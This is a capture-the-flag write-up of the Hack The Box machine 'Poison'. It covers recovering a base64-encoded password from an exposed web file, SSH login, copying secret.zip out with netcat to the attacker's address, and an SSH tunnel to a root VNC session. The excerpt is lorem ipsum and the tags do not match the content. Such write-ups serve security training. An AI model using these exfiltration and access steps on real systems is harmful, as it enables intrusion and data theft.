---
layout: single
title: Poison - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2021-03-11
classes: wide
header:
  teaser: /assets/images/htb-writeup-poison/poison_logo.png
  teaser_home_page: true
  icon: /assets/images/htb.png
categories:
  - hackthebox
  - infosec
tags:  
  - osticket
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-poison/poison_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝

1. [root:/git/htb/poison]# nmap -Pn -n -sCV 10.10.10.84 --open                                                                       (master✱)
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
    | ssh-hostkey:
    |   2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA)
    |   256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 (ECDSA)
    |_  256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519)
    Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd


2. nmap -p- also only reveals SSH.. However if we browse to http://10.10.10.84/ we find a temporary website made to test
local .php scripts. One of the scripts that we can test is named 'listfiles.php'.

Run 'listfiles.php' and we get:
  Array ( [0] => . [1] => .. [2] => browse.php [3] => index.php [4] => info.php [5] => ini.php [6] => listfiles.php [7] => phpinfo.php [8] => pwdbackup.txt )


pwdbackup.txt sounds promising, browse to it:

[root:/git/htb/poison]# curl http://10.10.10.84/pwdbackup.txt                                                                     (master✱)
This password is secure, it's encoded atleast 13 times.. what could go wrong really..

Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU
bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS
bVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW
M040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs
WmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy
eG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G
WkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw
MXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa
T1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k
WFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk
WGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0
NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT
Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz
WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW
VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO
Ukd4RVdub3dPVU5uUFQwSwo=

It looks like a base64 encoded string, lets decode it (a bunch of times).

--- snip ---
[root:/git/htb/poison]# echo "VmxaU1MySXlSa2hVYmxKcFVrWktTMVpyVm5OalZsSnlWR3hhVG1FelFuaFhha2sxVkd4R1ZVMUVi                        (master✱)
RVJhZWpBNVEyYzlQUW89Cg==" | base64 --decode
VlZSS2IyRkhUblJpUkZKS1ZrVnNjVlJyVGxaTmEzQnhXakk1VGxGVU1EbERaejA5Q2c9PQo=
[root:/git/htb/poison]# echo "VlZSS2IyRkhUblJpUkZKS1ZrVnNjVlJyVGxaTmEzQnhXakk1VGxGVU1EbERaejA5Q2c9PQo=" | base64 --decode         (master✱)
VVRKb2FHTnRiRFJKVkVscVRrTlZNa3BxWjI5TlFUMDlDZz09Cg==
[root:/git/htb/poison]# echo "VVRKb2FHTnRiRFJKVkVscVRrTlZNa3BxWjI5TlFUMDlDZz09Cg==" | base64 --decode                             (master✱)
UTJoaGNtbDRJVElqTkNVMkpqZ29NQT09Cg==
[root:/git/htb/poison]# echo "UTJoaGNtbDRJVElqTkNVMkpqZ29NQT09Cg==" | base64 --decode                                             (master✱)
Q2hhcml4ITIjNCU2JjgoMA==
[root:/git/htb/poison]# echo "Q2hhcml4ITIjNCU2JjgoMA==" | base64 --decode                                                         (master✱)
Charix!2#4%6&8(0


3. We got a password, maybe Charix is also the username. Lets try to SSH using creds charix:Charix!2#4%6&8(0

[root:/git/htb/poison]# ssh charix@poison.htb                                                                                     (master✱)
Password for charix@Poison:
Last login: Mon Mar 19 16:38:00 2018 from 10.10.14.4
FreeBSD 11.1-RELEASE (GENERIC) #0 r321309: Fri Jul 21 02:08:28 UTC 2017

Welcome to FreeBSD!

--- snip ---

Edit /etc/motd to change this login announcement.
The default editor in FreeBSD is vi, which is efficient to use when you have
learned it, but somewhat user-unfriendly.  To use ee (an easier but less
powerful editor) instead, set the environment variable EDITOR to /usr/bin/ee

charix@Poison:~ % id
  uid=1001(charix) gid=1001(charix) groups=1001(charix)
charix@Poison:~ % cat user.txt
  eaacdfb2d141b72a589233063604209c


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1. In ~ we find the obvious file 'secret.zip', transfer the file to your local computer and start working on it.

[root:/git/htb/poison]# nc -lp 4488 > secret.zip
charix@Poison:~ % nc -w 3 10.10.14.12 4488 < secret.zip
[root:/git/htb/poison]# 7z e secret.zip                                                                                           (master✱)

Scanning the drive for archives:
1 file, 166 bytes (1 KiB)

Extracting archive: secret.zip
--
Path = secret.zip
Type = zip
Physical Size = 166

Enter password (will not be echoed): Charix!2#4%6&8(0
Everything is Ok

Size:       8
Compressed: 166

[root:/git/htb/poison]# ls -al                                                                                                    (master✱)
--- snip ---
-r--r--r--  1 root root    8 Jan 24  2018 secret
[root:/git/htb/poison]# cat secret                                                                                                (master✱)
��[|Ֆz!#
[root:/git/htb/poison]# strings secret
[root:/git/htb/poison]# file -i secret                                                                                            (master✱)
secret: text/plain; charset=unknown-8bit
[root:/git/htb/poison]# file -b secret                                                                                            (master✱)
Non-ISO extended-ASCII text, with no line terminators

Opening the file in gui text editor and going to 'save as' says that the Character Encoding is 'Western (ISO-8859-15)'.
Change the encoding to UTF-8 and save as 'secret-utf8'.

[root:/git/htb/poison]# cat secret-utf8                                                                                           (master✱)
œš[|Õz!

[root:/git/htb/poison]# for i in $(cat result.txt | grep ok: | awk '{print $1}'); do                                              (master✱)
for> printf "writing $i to loop.out\n"
for> printf "\n$i: " >> loop.out
for> iconv -f $i -t UTF-8 secret >> loop.out
for> done

After looking through all data in loop.out, none of it makes sense. This is probably a rabbit hole.


2. Running linpeas.sh we find a few things that sticks out.

====================================( Available Software )====================================
[+] Useful software
--- snip ---
/usr/local/bin/xterm

================================( Processes, Cron, Services, Timers & Sockets )================================
[+] Cleaned processes
--- snip ---
root    529  0.0  0.9  23620  8868 v0- I    13:43    0:00.02 Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/classes -auth /root/.Xautho
root    540  0.0  0.7  67220  7064 v0- I    13:43    0:00.02 xterm -geometry 80x24+10+10 -ls -title X Desktop

Linpeas fails to provide us with a list of open sockets / ports, grab that ourselves.
charix@Poison:/tmp % sockstat -4 -l
  USER     COMMAND    PID   FD PROTO  LOCAL ADDRESS         FOREIGN ADDRESS
  www      httpd      735   4  tcp4   *:80                  *:*
  root     sendmail   672   3  tcp4   127.0.0.1:25          *:*
  www      httpd      671   4  tcp4   *:80                  *:*
  www      httpd      670   4  tcp4   *:80                  *:*
  www      httpd      669   4  tcp4   *:80                  *:*
  www      httpd      668   4  tcp4   *:80                  *:*
  www      httpd      667   4  tcp4   *:80                  *:*
  root     httpd      655   4  tcp4   *:80                  *:*
  root     sshd       620   4  tcp4   *:22                  *:*
  root     Xvnc       529   1  tcp4   127.0.0.1:5901        *:*
  root     Xvnc       529   3  tcp4   127.0.0.1:5801        *:*
  root     syslogd    390   7  udp4   *:514                 *:*


3. We are unable to SSH from the victim back to us (-R), so lets to a local (-L) port tunnel.

[root:/git/htb/poison]# ssh -L 5901:127.0.0.1:5901 charix@10.10.10.84                                                             (master✱)
Password for charix@Poison: Charix!2#4%6&8(0

The tunnel is setup and we can verify it using lsof:
[root:/opt]# sudo lsof -i -P -n | grep LISTEN
  --- snip ---
  ssh       29038 root    4u  IPv6 592189      0t0  TCP [::1]:5901 (LISTEN)
  ssh       29038 root    5u  IPv4 592190      0t0  TCP 127.0.0.1:5901 (LISTEN

We know that the service is vnc, so connect to it using vncviewer:
[root:/opt]# vncviewer 127.0.0.1:5901
  Connected to RFB server, using protocol version 3.8
  Enabling TightVNC protocol extensions
  Performing standard VNC authentication
  Password: Charix!2#4%6&8(0
  Authentication failed

Looking further into vncviewer the flag '-passwd' can be used for password files, maybe the unknown file is a pass file?
[root:/opt]# vncviewer --help
  --- snip ---
  -passwd <PASSWD-FILENAME> (standard VNC authentication)


[root:/git/htb/poison]# vncviewer 127.0.0.1:5901 -passwd secret                                                                   (master✱)
  Connected to RFB server, using protocol version 3.8
  Enabling TightVNC protocol extensions
  Performing standard VNC authentication
  Authentication successful
  Desktop name "root's X desktop (Poison:1)"
  VNC server default format:
    32 bits per pixel.
    Least significant byte first in each pixel.
    True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
  Using default colormap which is TrueColor.  Pixel format:
    32 bits per pixel.
    Least significant byte first in each pixel.
    True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
  Same machine: preferring raw encoding

root@Poison:~ # id
  uid=0(root) gid=0(wheel) groups=0(wheel),5(operator)
root@Poison:~ # cat root.txt
  716d04b188419cf2bb99d891272361f5


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝

FreeBSD Listening Ports:
  https://www.cyberciti.biz/tips/freebsd-lists-open-internet-unix-domain-sockets.html

SSH Port Tunneling:
  https://www.ssh.com/ssh/tunneling/example
